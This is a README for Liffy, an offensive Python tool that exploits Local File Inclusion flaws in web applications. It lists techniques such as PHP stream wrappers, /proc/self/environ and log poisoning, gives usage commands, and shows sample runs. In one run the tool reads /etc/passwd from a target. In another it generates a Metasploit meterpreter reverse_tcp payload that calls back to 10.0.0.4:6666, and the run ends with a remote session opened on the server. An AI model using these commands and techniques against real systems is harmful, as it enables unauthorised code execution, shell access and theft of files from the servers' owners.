Liffy
=====

Liffy is a Local File Inclusion Exploitation tool.  

Current features include: 

  - data:// for code execution
  - expect:// for code execution
  - input:// for code execution
  - filter:// for arbitrary file reads
  - /proc/self/environ for code execution in CGI mode
  - Apache access.log poisoning
  - Linux auth.log SSH poisoning
  - Direct payload delivery with no stager
  - Support for absolute and relative paths 
  - Support for cookies

! I have had issues with access log poisoning on current versions of Apache.  This not an issue with the payload delivery and or poisoning.  This is more of an issue with the request after the poisoning to kick off your shell.  This may require a browser refresh. !

Install
=======

Liffy requires the following libraries: requests, argparse, blessings, urlparse, daemon

*Update* - Liffy now has built-in web serving functionality for all techniques that use the staged approach.  This is built upon Python's simpleHTTPServer module, and is being daemonized once spawned as a process within core.py.  I have had some issues with socket reuse and the child process not being killed correctly, so QA would be appreciated, and or suggestions on how to design it better. 


Example Usage 
==============

```
./liffy --url http://target/pdfs/vulnerable.php?= --data
./liffy --url http://target/pdfs/vulnerable.php?= --data --nostager



ruckus:liffy rotlogix$ python liffy.py --url http://10.0.0.11/vuln/lfi.php?file= --filter


    .____    .__  _____  _____
    |    |   |__|/ ____\/ ____\__.__.
    |    |   |  \   __\   __<   |  |
    |    |___|  ||  |   |  |  \___  |
    |_______ \__||__|   |__|  / ____| v1.2
        \/                \/


[2014-08-03 19:36:33.002626] Checking Target: http://10.0.0.11/vuln/lfi.php?file=
[2014-08-03 19:36:33.002722] ......................................................................
[2014-08-03 19:36:33.791168] Target URL Looks Good!
[2014-08-03 19:36:33.791210] Filter Technique Selected!
[2014-08-03 19:36:33.791336] Please Enter File To Read: /etc/passwd
[2014-08-03 19:36:38.319685] Decoded: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-
data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-
Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false mysql:x:102:105:MySQL
Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin



    .____    .__  _____  _____
    |    |   |__|/ ____\/ ____\__.__.
    |    |   |  \   __\   __<   |  |
    |    |___|  ||  |   |  |  \___  |
    |_______ \__||__|   |__|  / ____| v1.2
        \/                \/


[2014-08-03 19:39:33.674202] Checking Target: http://10.0.0.11/vuln/lfi.php?file=
[2014-08-03 19:39:33.674297] ......................................................................
[2014-08-03 19:39:34.454758] Target URL Looks Good!
[2014-08-03 19:39:34.454795] Data Technique Selected!
[2014-08-03 19:39:34.454877] Please Enter Host For Callbacks: 10.0.0.4
[2014-08-03 19:39:37.112427] Please Enter Port For Callbacks: 6666
[2014-08-03 19:39:38.597878] Generating Wrapper
[2014-08-03 19:39:38.597955] ......................................................................
[2014-08-03 19:39:39.347935] Success!
[2014-08-03 19:39:39.348007] Generating Metasploit Payload
[2014-08-03 19:39:39.348059] ......................................................................
[2014-08-03 19:39:46.289658] Generated Metasploit Resource File
[2014-08-03 19:39:46.289704] Load Metasploit: msfconsole -r php_listener.rc
[2014-08-03 19:39:46.289734] Starting Web Server ...
[2014-08-03 19:39:46.289750] ......................................................................
[2014-08-03 19:39:47.049321] Press Enter To Continue When Your Metasploit Handler is Running ...


[*] Processing php_listener.rc for ERB directives.
resource (php_listener.rc)> use multi/handler
resource (php_listener.rc)> set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
resource (php_listener.rc)> set LHOST 10.0.0.4
LHOST => 10.0.0.4
resource (php_listener.rc)> set LPORT 6666
LPORT => 6666
resource (php_listener.rc)> set ExitOnSession false
ExitOnSession => false
resource (php_listener.rc)> exploit -j
[*] Exploit running as background job.

[*] Started reverse handler on 10.0.0.4:6666
[*] Starting the payload handler...
msf exploit(handler) > [*] Sending stage (40551 bytes) to 10.0.0.11
[*] Meterpreter session 1 opened (10.0.0.4:6666 -> 10.0.0.11:52410) at 2014-08-03 19:40:39 -0700
msf exploit(handler) >

```

Sidenote
========

Original release repository https://github.com/rotlogix/liffy is no longer available.
